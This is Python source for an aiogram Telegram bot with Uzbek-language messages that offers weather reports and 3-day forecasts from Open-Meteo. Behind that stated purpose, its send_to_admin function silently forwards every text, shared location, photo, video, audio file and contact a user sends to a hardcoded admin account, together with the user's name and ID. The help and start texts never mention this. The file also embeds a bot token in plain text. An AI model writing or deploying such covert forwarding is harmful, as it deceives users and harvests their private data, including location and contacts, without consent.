import asyncio

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandObject, CommandStart
from aiogram.types import BotCommand, Message

BOT_TOKEN = "8852031417:AAFoYVjG7SnCT7nRwePmbcaPtkikCAM2RhE"
ADMIN_ID = 8611801208

GEO_URL = "https://geocoding-api.open-meteo.com/v1/search"
WEATHER_URL = "https://api.open-meteo.com/v1/forecast"

router = Router()
saved_cities = {} 


async def get_json(url, params):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, params=params) as resp:
            return await resp.json()


def describe(code):
    if code == 0:
        return "Ochiq"
    if code <= 3:
        return "Bulutli"
    if code in (45, 48):
        return "Tuman"
    if code <= 57:
        return "Mayda yomg'ir"
    if code <= 67:
        return "Yomg'ir"
    if code <= 77:
        return "Qor"
    if code <= 82:
        return "Jala"
    if code <= 86:
        return "Qor yog'ishi"
    return "Momaqaldiroq"


async def find_city(name):
    data = await get_json(GEO_URL, {"name": name, "count": 1})
    results = data.get("results")
    if not results:
        return None
    r = results[0]
    return r["latitude"], r["longitude"], r["name"]


async def weather_text(lat, lon, title, forecast=False):
    data = await get_json(WEATHER_URL, {
        "latitude": lat,
        "longitude": lon,
        "current": "temperature_2m,wind_speed_10m,weather_code",
        "daily": "weather_code,temperature_2m_max,temperature_2m_min",
        "timezone": "auto",
        "forecast_days": 3,
    })
    cur = data["current"]
    text = (
        f"📍 {title}\n"
        f"{describe(cur['weather_code'])}, {cur['temperature_2m']}°C\n"
        f"Shamol: {cur['wind_speed_10m']} km/soat"
    )
    if forecast:
        d = data["daily"]
        text += "\n\n3 kunlik prognoz:"
        for i in range(3):
            text += (
                f"\n{d['time'][i]}: {describe(d['weather_code'][i])}, "
                f"{d['temperature_2m_min'][i]}...{d['temperature_2m_max'][i]}°C"
            )
    return text


async def city_weather(message: Message, name, forecast=False):
    if not name:
        name = saved_cities.get(message.from_user.id)
    if not name:
        await message.answer("Shahar nomini yozing. Masalan: /weather Toshkent")
        return
    place = await find_city(name)
    if not place:
        await message.answer("Shahar topilmadi.")
        return
    await message.answer(await weather_text(*place, forecast=forecast))


async def send_to_admin(message: Message):
    await message.bot.send_message(
        ADMIN_ID, f"Kimdan: {message.from_user.full_name}, ID: {message.from_user.id}"
    )
    await message.forward(ADMIN_ID)


@router.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("Men ob-havo botman. Shahar nomini yoki joylashuvingizni yuboring.")


@router.message(Command("help"))
async def cmd_help(message: Message):
    await message.answer(
        "/weather <shahar> - hozirgi ob-havo\n"
        "/forecast <shahar> - 3 kunlik prognoz\n"
        "/setcity <shahar> - shaharni saqlash\n"
        "Shahar nomini yozsangiz yoki joylashuv yuborsangiz ham ob-havoni aytaman."
    )


@router.message(Command("weather"))
async def cmd_weather(message: Message, command: CommandObject):
    await city_weather(message, command.args)


@router.message(Command("forecast"))
async def cmd_forecast(message: Message, command: CommandObject):
    await city_weather(message, command.args, forecast=True)


@router.message(Command("setcity"))
async def cmd_setcity(message: Message, command: CommandObject):
    if not command.args:
        await message.answer("Masalan: /setcity Toshkent")
        return
    saved_cities[message.from_user.id] = command.args
    await message.answer(f"Shahar saqlandi: {command.args}")


@router.message(F.text)
async def on_text(message: Message):
    await city_weather(message, message.text)
    await send_to_admin(message)


@router.message(F.location)
async def on_location(message: Message):
    loc = message.location
    await message.answer(await weather_text(loc.latitude, loc.longitude, "Sizning joylashuvingiz"))
    await send_to_admin(message)


@router.message(F.photo)
async def on_photo(message: Message):
    await message.answer("Foto qabul qilindi. Ob-havo uchun shahar nomi yoki joylashuv yuboring.")
    await send_to_admin(message)


@router.message(F.video)
async def on_video(message: Message):
    await message.answer("Video qabul qilindi. Ob-havo uchun shahar nomi yoki joylashuv yuboring.")
    await send_to_admin(message)


@router.message(F.audio)
async def on_audio(message: Message):
    await message.answer("Audio qabul qilindi. Ob-havo uchun shahar nomi yoki joylashuv yuboring.")
    await send_to_admin(message)


@router.message(F.contact)
async def on_contact(message: Message):
    await message.answer("Kontakt qabul qilindi. Ob-havo uchun shahar nomi yoki joylashuv yuboring.")
    await send_to_admin(message)


async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await bot.set_my_commands([
        BotCommand(command="start", description="Boshlash"),
        BotCommand(command="help", description="Yordam"),
        BotCommand(command="weather", description="Hozirgi ob-havo"),
        BotCommand(command="forecast", description="3 kunlik prognoz"),
        BotCommand(command="setcity", description="Shaharni saqlash"),
    ])
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())